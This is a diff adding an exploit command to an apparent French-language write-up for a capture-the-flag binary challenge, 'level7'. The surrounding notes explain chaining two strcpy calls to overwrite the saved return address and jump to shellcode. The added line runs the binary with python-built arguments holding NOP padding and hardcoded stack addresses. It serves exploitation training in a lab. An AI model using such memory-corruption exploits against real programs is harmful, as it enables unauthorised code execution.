@@ -6,3 +6,5 @@ On se sert du premier strcpy pour modifier l'adresse à laquelle le second strcp
 On y met l'adresse du eip stocké pour la sortie de strcpy.
 
 On se sert du second strcpy pour écrire l'adresse de notre shelcode en memoire.
+
+/home/user/level7/level7 `python -c "print '\x90' * 20 + '\xcc''\xcf''\xff''\xbf'"` `python -c "print '\x47''\xf0''\xff''\xbf'"`
